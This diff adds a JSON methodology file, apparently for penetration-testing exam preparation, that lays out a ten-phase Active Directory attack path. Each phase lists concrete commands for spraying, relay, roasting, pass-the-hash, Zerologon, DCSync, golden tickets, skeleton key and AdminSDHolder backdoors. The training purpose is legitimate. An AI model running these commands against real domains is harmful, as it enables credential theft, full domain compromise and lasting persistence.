@@ -1,0 +1,323 @@
+{
+  "id": "ad-argha-dey-methodology",
+  "zone": "active-directory",
+  "name": "Argha Dey Active Directory Attack Methodology",
+  "source": "Argha Dey CPENT Notes (94% scorer)",
+  "description": "10-phase AD methodology: Recon \u2192 Enumeration \u2192 Foothold \u2192 Credential Access \u2192 PrivEsc \u2192 Lateral Movement \u2192 Domain Dominance \u2192 Persistence. Includes per-host quick reference and mental checklist before calling a box 'owned'.",
+  "examHabits": [
+    "Confirm domain name, forest, DC(s) before exploitation",
+    "Enumerate all users/groups/computers",
+    "Check for Kerberoastable / ASREPRoastable accounts",
+    "Check SMB signing + null session exposure",
+    "Check trusts (direction, type, foreign principals)",
+    "Check delegation (unconstrained/constrained/RBCD)",
+    "Check GPP/SYSVOL for cached creds",
+    "Attempt DCSync if privileged",
+    "Extract flags / persistence artifacts as required",
+    "Document every credential + hash found (reused across trusts often)"
+  ],
+  "quickRef": "nxc smb <range>; impacket-GetNPUsers <domain>/ -usersfile users.txt -format hashcat; kerberoasting with GetUserSPNs; DCSync via secretsdump -just-dc",
+  "steps": [
+    {
+      "phase": "Phase 1 - Passive & Semi-Passive Recon",
+      "techniques": [
+        "passive-recon",
+        "dns-enumeration"
+      ],
+      "tools": [
+        "nxc",
+        "nmap",
+        "nslookup",
+        "dig",
+        "enum4linux"
+      ],
+      "decisionPoints": [
+        {
+          "condition": "AD network range known",
+          "action": "nxc smb <range> OR crackmapexec smb <range> - master map: IP, hostname, OS, domain, SMB signing, SMBv1",
+          "fallback": "nmap -p 88,389,445,3268 --open -T4 <range>"
+        },
+        {
+          "condition": "Domain name identified",
+          "action": "nslookup -type=SRV _ldap._tcp.dc._msdcs.<domain>; nslookup -type=SRV _kerberos._tcp.<domain>; dig axfr @<dns-ip> <domain>",
+          "fallback": "Proceed to RPC-based enumeration"
+        },
+        {
+          "condition": "Suspected DC port combo (88+389+445)",
+          "action": "nmap --script smb-os-discovery -p445; nmap --script rdp-ntlm-info -p3389; nmap --script smtp-ntlm-info -p25; ldapsearch -x -H ldap://<dc-ip> -s base namingcontexts",
+          "fallback": "Use rpcclient null session for info leak"
+        }
+      ]
+    },
+    {
+      "phase": "Phase 2 - Unauthenticated / Null-Session Enumeration",
+      "techniques": [
+        "smb-enumeration"
+      ],
+      "tools": [
+        "rpcclient",
+        "smbclient",
+        "enum4linux",
+        "kerbrute",
+        "nxc"
+      ],
+      "decisionPoints": [
+        {
+          "condition": "SMB/LDAP open with no creds",
+          "action": "rpcclient -U '' -N <dc-ip> then enumdomusers, enumdomgroups, querydominfo, enumtrust, lsaenumsid",
+          "fallback": "smbclient -L //<target> -N; enum4linux-ng -A <target>"
+        },
+        {
+          "condition": "Valid usernames needed (lockout-safe)",
+          "action": "kerbrute userenum -d <domain> --dc <dc-ip> usernames.txt",
+          "fallback": "nmap -p88 --script krb5-enum-users with realm arg"
+        },
+        {
+          "condition": "ASREPRoastable accounts suspected",
+          "action": "impacket-GetNPUsers <domain>/ -usersfile usernames.txt -no-pass -format hashcat -outputfile asrep.txt; hashcat -m 18200 asrep.txt rockyou.txt",
+          "fallback": "Check userAccountControl flag 4194304 via LDAP search"
+        }
+      ]
+    },
+    {
+      "phase": "Phase 3 - Credential Gathering (Spraying & Poisoning)",
+      "techniques": [
+        "password-spraying",
+        "kerberoasting",
+        "asrep-roasting",
+        "llmnr-poisoning"
+      ],
+      "tools": [
+        "nxc",
+        "crackmapexec",
+        "hydra",
+        "responder",
+        "hashcat",
+        "kerbrute"
+      ],
+      "decisionPoints": [
+        {
+          "condition": "Userlist obtained",
+          "action": "nxc smb <target/range> -u users.txt -p passwords.txt --continue-on-success",
+          "fallback": "crackmapexec smb <target> -u users.txt -p 'Season2026!' --continue-on-success"
+        },
+        {
+          "condition": "Other protocols (RDP/LDAP)",
+          "action": "hydra -L users.txt -P passwords.txt rdp://<target>; kerbrute passwordspray -d <domain> --dc <dc-ip> users.txt 'Password123!'",
+          "fallback": "Responder -I eth0 -wrf for LLMNR/NBT-NS poisoning; hashcat -m 5600 hash.txt rockyou.txt"
+        }
+      ]
+    },
+    {
+      "phase": "Phase 4 - NTLM Relay (Signing Not Required)",
+      "techniques": [
+        "ntlm-relay"
+      ],
+      "tools": [
+        "impacket",
+        "responder",
+        "nxc",
+        "nmap"
+      ],
+      "decisionPoints": [
+        {
+          "condition": "SMB signing not required",
+          "action": "Check signing state: nmap --script smb2-security-mode; if not required, ntlmrelayx.py -tf targets.txt -smb2support",
+          "fallback": "Use Responder with SMB server disabled, relay captured hashes live"
+        }
+      ]
+    },
+    {
+      "phase": "Phase 5 - Authenticated Enumeration (LDAP Deep Dive)",
+      "techniques": [
+        "kerberoasting",
+        "asrep-roasting",
+        "delegation-enum"
+      ],
+      "tools": [
+        "ldapsearch",
+        "impacket",
+        "bloodhound",
+        "nmap"
+      ],
+      "decisionPoints": [
+        {
+          "condition": "Valid credentials obtained",
+          "action": "ldapsearch for users, computers, groups, SPNs, trusts, delegation, foreignSecurityPrincipals, GPOs/OUs, password-in-description",
+          "fallback": "impacket-GetUserSPNs <domain>/<user>:'<pass>' -dc-ip <dc-ip> -request"
+        },
+        {
+          "condition": "Attack path mapping needed",
+          "action": "bloodhound-python -u <user> -p '<pass>' -d <domain> -ns <dc-ip> -c All; load .json into BloodHound GUI",
+          "fallback": "PowerView: Get-DomainUser -SPN; Get-DomainUser -PreauthNotRequired; Find-InterestingDomainAcl; Get-DomainTrust"
+        }
+      ]
+    },
+    {
+      "phase": "Phase 6 - Foothold & Shell (Impacket Suite, PtH)",
+      "techniques": [
+        "pass-the-hash",
+        "pass-the-ticket",
+        "overpass-the-hash"
+      ],
+      "tools": [
+        "impacket",
+        "nxc",
+        "evil-winrm",
+        "bloodhound",
+        "mimikatz"
+      ],
+      "decisionPoints": [
+        {
+          "condition": "Valid credentials (plaintext)",
+          "action": "impacket-psexec <domain>/<user>:'<pass>'@<target>; impacket-wmiexec (quieter); impacket-smbexec",
+          "fallback": "evil-winrm -i <target> -u <user> -p '<pass>'"
+        },
+        {
+          "condition": "NTLM hash only (no plaintext)",
+          "action": "impacket-psexec -hashes :<NTLM-hash> <domain>/<user>@<target>; nxc smb <target> -u <user> -H <NTLM-hash>",
+          "fallback": "evil-winrm -i <target> -u <user> -H <NTLM-hash>"
+        },
+        {
+          "condition": "Kerberoastable/TGT available",
+          "action": "impacket-getTGT <domain>/<user> -hashes :<NTLM-hash>; export KRB5CCNAME=<user>.ccache; impacket-psexec -k -no-pass <domain>/<user>@<target>",
+          "fallback": "xfreerdp3 /u:<user> /p:'<pass>' /v:<target> /cert:ignore +clipboard /dynamic-resolution"
+        }
+      ]
+    },
+    {
+      "phase": "Phase 7 - Local Privilege Escalation (Windows)",
+      "techniques": [
+        "always-install-elevated",
+        "unquoted-service-paths",
+        "dll-hijacking",
+        "token-impersonation",
+        "gpp-cached-passwords"
+      ],
+      "tools": [
+        "powerup",
+        "winpeas",
+        "seatbelt",
+        "mimikatz",
+        "accesschk"
+      ],
+      "decisionPoints": [
+        {
+          "condition": "Low-priv shell on Windows",
+          "action": "systeminfo; whoami /priv; whoami /groups; wmic qfe get HotFixID; winPEAS.exe; PowerUp Invoke-AllChecks",
+          "fallback": "Manual: check AlwaysInstallElevated, unquoted paths, weak service perms, scheduled tasks"
+        },
+        {
+          "condition": "SeImpersonatePrivilege = Enabled",
+          "action": "PrintSpoofer.exe -c cmd or GodPotato.exe -cmd 'C:\\payload.exe'",
+          "fallback": "JuicyPotato -l 1337 -p C:\\payload.exe -t * -c {CLSID}"
+        }
+      ]
+    },
+    {
+      "phase": "Phase 8 - Domain Privilege Escalation",
+      "techniques": [
+        "kerberoasting",
+        "acl-abuse-genericall",
+        "acl-abuse-forcechangepassword",
+        "unconstrained-delegation",
+        "constrained-delegation-s4u",
+        "rbcd-attack",
+        "gpo-abuse"
+      ],
+      "tools": [
+        "impacket",
+        "mimikatz",
+        "certipy",
+        "bloodhound",
+        "powerview"
+      ],
+      "decisionPoints": [
+        {
+          "condition": "SPN account with weak creds is privileged",
+          "action": "Kerberoast \u2192 crack hashcat -m 13100 \u2192 instant domain compromise",
+          "fallback": "ACL abuse via BloodHound path"
+        },
+        {
+          "condition": "GenericAll on user",
+          "action": "Set-ADAccountPassword -Identity <target> -Reset -NewPassword (ConvertTo-SecureString 'NewPass123!' -AsPlainText -Force)",
+          "fallback": "GenericAll on group: Add-ADGroupMember"
+        },
+        {
+          "condition": "Unconstrained delegation host compromised",
+          "action": "Force DC auth via PrinterBug/PetitPotam; capture TGT with mimikatz sekurlsa::tickets /export",
+          "fallback": "Constrained delegation: impacket-getST -spn <svc> -impersonate administrator"
+        },
+        {
+          "condition": "RBCD path via BloodHound",
+          "action": "impacket-rbcd -delegate-from '<attacker>$' -delegate-to '<target>$' -action write; then impacket-getST -spn cifs/<target-fqdn> -impersonate administrator",
+          "fallback": "ADCS abuse: certipy find; certipy req -template <vuln-template>; certipy auth -pfx <cert>.pfx"
+        }
+      ]
+    },
+    {
+      "phase": "Phase 9 - Lateral Movement & Domain Dominance",
+      "techniques": [
+        "pass-the-hash",
+        "pass-the-ticket",
+        "dcsync",
+        "overpass-the-hash"
+      ],
+      "tools": [
+        "crackmapexec",
+        "evil-winrm",
+        "impacket",
+        "nxc",
+        "mimikatz"
+      ],
+      "decisionPoints": [
+        {
+          "condition": "Valid creds or hashes obtained",
+          "action": "CrackMapExec / nxc to spray credentials across network; Evil-WinRM for WinRM-enabled hosts",
+          "fallback": "Pass-the-Hash with -hashes flag"
+        },
+        {
+          "condition": "Domain Admin access achieved",
+          "action": "impacket-secretsdump -just-dc <domain>/<user>:'<pass>'@<dc-ip> to extract all domain hashes",
+          "fallback": "DCSync via Mimikatz: lsadump::dcsync /domain:<domain> /user:krbtgt"
+        },
+        {
+          "condition": "CVE-based domain compromise applicable",
+          "action": "Zerologon (CVE-2020-1472): python3 cve-2020-1472-exploit.py <DC_NAME> <DC_IP> then secretsdump -no-pass; PrintNightmare (CVE-2021-1675)",
+          "fallback": "noPac.py -shell for SAMAccountName spoofing; PetitPotam for NTLM coerce \u2192 relay to ADCS"
+        }
+      ]
+    },
+    {
+      "phase": "Phase 10 - Persistence",
+      "techniques": [
+        "golden-ticket",
+        "silver-ticket",
+        "skeleton-key",
+        "gpp-abuse"
+      ],
+      "tools": [
+        "mimikatz",
+        "impacket",
+        "certipy"
+      ],
+      "decisionPoints": [
+        {
+          "condition": "KRBTGT hash obtained (via DCSync)",
+          "action": "mimikatz kerberos::golden /user:administrator /domain:<domain> /sid:<domain-sid> /krbtgt:<hash> /ptt OR impacket-ticketer -nthash <krbtgt> -domain-sid <sid> -domain <domain> administrator",
+          "fallback": "Silver ticket for specific service: kerberos::golden /service:cifs /target:<fqdn> /rc4:<svc-hash> /ptt"
+        },
+        {
+          "condition": "DA + DC access available",
+          "action": "mimikatz misc::skeleton (master password for all accounts)",
+          "fallback": "AdminSDHolder backdoor: modify ACL on AdminSDHolder to grant low-priv user full control (replicates every 60 min)"
+        },
+        {
+          "condition": "Need stealthy persistence",
+          "action": "DSRM password abuse: reg save HKLM\\SAM/\\SYSTEM; impacket-secretsdump -sam sam.save -system system.save LOCAL",
+          "fallback": "Plumhound for AD audit-log persistence tracking"
+        }
+      ]
+    }
+  ]
+}
